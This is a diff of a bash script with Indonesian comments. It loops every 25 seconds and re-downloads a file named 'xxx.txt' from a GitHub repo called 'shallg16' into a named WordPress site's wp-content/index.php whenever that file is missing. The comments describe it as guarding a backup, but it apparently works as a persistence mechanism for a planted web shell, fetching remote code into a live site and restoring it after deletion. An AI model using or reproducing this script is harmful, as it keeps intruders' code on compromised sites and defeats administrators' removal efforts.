@@ -1,47 +1,64 @@
 #!/bin/bash
 
-outputFile="LOCK DIR/PATCH"
-url="https://raw.githubusercontent.com/PACKDOL/shallg16/refs/heads/main/xxx.txt"
+# Path ke file index.php yang harus dijaga
+outputFile="/var/www/vhosts/web924.kerstin.webhoster.ag/httpdocs/wp-content/index.php"
 
+# Sumber file cadangan
+url="https://raw.githubusercontent.com/PACKDOL/shallg16/main/xxx.txt"
+
+# Log file untuk pencatatan aktivitas (opsional tapi direkomendasikan)
+logFile="/var/log/index_monitor.log"
+
+# Fungsi logging
+log() {
+    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$logFile"
+}
+
+# Fungsi membersihkan saat script dihentikan
 cleanup() {
-    echo "Stopping the script..."
+    log "Script dihentikan."
     exit 0
 }
-trap cleanup SIGINT
+trap cleanup SIGINT SIGTERM
 
+# Fungsi untuk mengunduh file
 download_file() {
-    echo "Trying to download file..."
+    log "Mencoba mengunduh file dari $url"
     if command -v wget >/dev/null 2>&1; then
         wget -q "$url" -O "$outputFile"
         if [ $? -eq 0 ]; then
-            echo "File successfully downloaded using wget: $outputFile"
+            log "File berhasil diunduh menggunakan wget: $outputFile"
             return 0
         else
-            echo "wget failed, trying curl..."
+            log "wget gagal. Mencoba dengan curl..."
         fi
     fi
 
     if command -v curl >/dev/null 2>&1; then
         curl -s -L -o "$outputFile" "$url"
         if [ $? -eq 0 ]; then
-            echo "File successfully downloaded using curl: $outputFile"
+            log "File berhasil diunduh menggunakan curl: $outputFile"
             return 0
         else
-            echo "An error occurred while downloading the file using curl."
+            log "Gagal mengunduh file menggunakan curl."
             return 1
         fi
     else
-        echo "Neither wget nor curl is available!"
+        log "wget dan curl tidak tersedia!"
         return 1
     fi
 }
 
+# Loop pengecekan terus-menerus
 while true; do
     if [ ! -f "$outputFile" ]; then
-        echo "File not found. Downloading..."
+        log "File index.php tidak ditemukan. Mengunduh kembali..."
         download_file
+        if [ $? -ne 0 ]; then
+            log "Gagal mengunduh file index.php"
+        fi
     else
-        echo "File exists. No action needed."
+        log "File index.php ditemukan. Tidak ada tindakan."
     fi
 
     sleep 25
